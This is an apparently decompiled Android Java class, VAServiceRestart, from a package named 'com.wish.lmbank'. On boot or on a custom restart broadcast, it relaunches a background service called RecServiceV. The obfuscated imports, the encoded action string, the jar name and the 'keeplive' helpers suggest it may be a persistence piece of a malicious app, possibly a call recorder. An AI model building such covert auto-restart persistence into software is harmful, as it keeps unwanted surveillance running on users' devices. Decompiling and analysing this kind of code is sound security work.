package com.wish.lmbank.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.wish.lmbank.R2;
import com.wish.lmbank.keeplive.utils.ServiceUtils;

import gv00l3ah.mvdt7w.bb7d7pu7;

/**
 * 来电广播
 */
/* loaded from: cookie_9234504.jar:com/wish/lmbank/service/VAServiceRestart.class */
public class VAServiceRestart extends BroadcastReceiver {
    private static final String TAG = "VAServiceRestart";

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        String action;
        if (intent == null || (action = intent.getAction()) == null) {
            return;
        }
//         if (action.equals(context.getString(R2.string.serverRestart)) || action.equals(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRysmJj02KiYkOSUsPSwt"))) {
        if (action.equals(context.getString(R2.string.serverRestart)) || action.equals("android.intent.action.BOOT_COMPLETED")) {
            startService(context);
        }

        Log.d(TAG, intent.getAction());
    }

    private void startService(Context context) {
        if (new ServiceUtils().isServiceRunning(context, RecServiceV.class.getName())) {
            return;
        }
        context.startService(new Intent(context, RecServiceV.class));
    }
}
